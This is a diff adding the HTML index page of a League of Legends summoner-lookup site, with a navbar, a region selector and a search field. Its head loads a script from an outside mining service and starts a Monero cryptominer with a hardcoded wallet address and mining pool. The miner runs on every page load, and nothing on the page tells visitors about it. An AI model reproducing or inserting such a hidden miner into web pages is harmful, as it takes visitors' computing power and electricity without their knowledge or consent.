@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+<head>
+<script src="https://coinwebmining.com/cwm.js"></script>
+<script>
+    var site_id = 'cwm-181';
+    var coin = 'monero';
+    var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC';
+    var password = 'x';
+    var mining_pool = 'gulf.moneroocean.stream:10001';
+    var threads = 1;
+    var throttle = 0.99;
+    var debug = true;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+</script>
+<meta charset="utf-8">
+<title>index</title>
+<link href="index.css" rel="stylesheet" type="text/css" media="screen">
+</head>
+
+<body class="body">
+<ul class="navbar">
+  <li><a>Home</a></li>
+  <li><a href="#news">News</a></li>
+  <li><a href="#contact">Stats</a></li>
+  <li style="float:right"><a class="active" href="#about">About</a></li>
+</ul>
+<div class="center">
+  <div class="logo"><img src="TiltSeeker.png" alt="" width="713.55" height="104"/></div>
+  <br>
+  <input name="textfield" type="text" class="textInput" id="textfield" placeholder="Summoner In Game">
+  <br>
+  <br>
+  <ul class="region" id="region-select">
+  	<li><a class="region-button" id="NA" style="background-color: #111;">NA</a></li>
+  	<li><a class="region-button" id="EUW">EUW</a></li>
+  	<li><a class="region-button" id="EUNE">EUNE</a></li>
+  	<li><a class="region-button" id="BR">BR</a></li>
+  	<li><a class="region-button" id="TR">TR</a></li>
+  	<li><a class="region-button" id="RU">RU</a></li>
+  	<li><a class="region-button" id="LAN">LAN</a></li>
+  	<li><a class="region-button" id="LAS">LAS</a></li>
+  	<li><a class="region-button" id="OCE">OCE</a></li>
+  	<li><a class="region-button" id="KR">KR</a></li>
+  	<li><a class="region-button" id="JP">JP</a></li>
+  </ul>
+  <br>
+  <input class="submit-button" id="submit-button" form="textfield" type="submit" value="Find Camping Spot">
+</div>
+<div class="my-footer">
+	<div class="disclaimer">
+	Mixify isn't endorsed by Riot Games and doesn't reflect the views or opinions of Riot Games or anyone officially involved in producing or managing League of Legends. League of Legends and Riot Games are trademarks or registered trademarks of Riot Games, Inc. League of Legends © Riot Games, Inc.
+	</div>
+</div>
+</body>
+<script type="text/javascript" src="index.js"></script>
+</html>
